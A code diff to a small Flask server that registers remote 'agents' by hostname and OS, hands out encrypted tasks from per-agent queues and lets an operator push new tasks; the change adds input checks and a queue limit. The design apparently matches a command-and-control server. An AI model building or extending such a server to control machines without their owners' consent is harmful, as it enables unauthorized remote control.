@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify
 from common.cryptography_helpers import encrypt_string, decrypt_string
 import time
+import json
 
 app = Flask(__name__)
 
@@ -15,6 +16,9 @@ def status():
     agent_id = request.json.get('id')
     meta = data.get('meta', {})
     
+    if not agent_id:
+        return jsonify({"error": "missing id"}), 400
+    
     agents[agent_id] = {
         "hostname" : meta.get("hostname"),
         "os" : meta.get("os"),
@@ -23,8 +27,9 @@ def status():
     }
     
     if agent_id in tasks and tasks[agent_id]:
-        task = tasks[agent_id].pop(0)
+        task = tasks[agent_id][0]
         encrypted_task = encrypt_string(task)
+        task = tasks[agent_id].pop(0)
         return jsonify({"task": encrypted_task})
     else: 
         return jsonify({"task" : None})
@@ -43,16 +48,32 @@ def result():
 
 
 @app.route('/api/push', methods=['POST']) # old /task
-def task():
+def push_task():
     data = request.json
     agent_id = data.get('id')
     task = data.get('task')
-
+    
     if not agent_id or not task:
         return jsonify({"error": "Missing id or task"}), 400
+    
+    if agent_id not in agents:
+        return jsonify({"error": "Unknown agent"}), 404
+    
+    MAX_TASKS_PER_AGENT = 100
+    queue = tasks.setdefault(agent_id, [])
+    if len(queue) >= MAX_TASKS_PER_AGENT:
+        return jsonify({"error": "Task Queue Full"}), 429
+    
+    try: 
+        parsed = json.loads(task)
+    except json.JSONDecodeError:
+        return jsonify({"error": "Task must be valid JSON"}), 400
 
-    tasks.setdefault(agent_id, []).append(task)
-
+    if "type" not in parsed:
+        return jsonify({"error": "Task missing 'type' field"}), 400
+    
+    queue.append(task)
+ 
     return jsonify({"status": "task queued"})
 
 
